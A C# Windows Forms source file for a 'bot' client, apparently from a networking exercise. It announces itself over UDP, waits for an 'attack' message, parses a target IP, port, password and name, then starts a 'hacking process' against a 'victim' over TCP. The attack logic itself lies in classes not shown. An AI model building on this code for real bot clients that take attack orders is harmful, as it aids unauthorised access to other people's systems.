using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace bot
{
    public partial class Form1 : Form
    {
        Client tcpClient;
        controller controller;
        UDPBot udpbot;
        public Form1()
        {
            InitializeComponent();
            tcpClient = new Client();
            udpbot = new UDPBot();
        }

        internal void UpdateMessageBox(string msg)
        {
            MessageBoxText.Text += msg + "\r\n";
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            /*
             int x = tcpClient.SendThePassword(PasswordTextBox.Text);
            if (x == -1)
            {
                DialogResult dialog = new DialogResult();

                dialog = MessageBox.Show("You were disconnected by the victim, do you wish to Exit?", "Alert!", MessageBoxButtons.YesNo);

                if (dialog == DialogResult.Yes)
                {
                    System.Environment.Exit(1);
                }
            }
            */
        }

        internal void setController(controller mController)
        {
            controller = mController;
            tcpClient.setController(mController);
            udpbot.setController(mController);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            udpbot.BotAnnouncment(PortTextBox.Text);
            var data = udpbot.WaitForAttack();
            string IP = ParseIP(data,0,4);
            tcpClient.SetServerIPAddress(IP);
            
            string port = ParsePort(data, 4, 2);
            tcpClient.SetPortNumber(port);
            
            string pass = ParsePass(data, 6, 6);
            tcpClient.SetPortNumber(port);
            
            string ShonName = ParseShobName(data, 12, 32);
            tcpClient.SetShobName(ShonName);
            
            tcpClient.StartHackingProcess();
            tcpClient.SendThePassword(pass);
            
        }

        private string ParseIP(byte[] data, int start, int length)
        {
            
            byte[] res = new byte[length];
            for (var i = start; i < start + length; i++)
                res[i - start] = data[i];
            string s = "";
            for (var i=0;i<4;i++)
            {
                if (i < 3)
                    s += res[i] + ".";
                else
                    s += res[i];
            }
            return s;
        }

        private string ParsePort(byte[] data, int start, int length)
        {

            byte[] res = new byte[length];
            for (var i = start; i < start + length; i++)
                res[i - start] = data[i];
            int result = res[0] + res[1] * 256;
            return result.ToString(); 
        }

        private string ParsePass(byte[] data, int start, int length)
        {

            byte[] res = new byte[length];
            for (var i = start; i < start + length; i++)
                res[i - start] = data[i];
            string s = "";
            string s2 = System.Text.Encoding.ASCII.GetString(res);
            string cleaned = s2.Replace("\0", "");
            return cleaned;
        }

        private string ParseShobName(byte[] data, int start, int length)
        {

            byte[] res = new byte[length];
            for (var i = start; i < start + length; i++)
                res[i - start] = data[i];
            string s2 = System.Text.Encoding.ASCII.GetString(res);
            string cleaned = s2.Replace("\0", "");
            return cleaned;
        }
    }
}
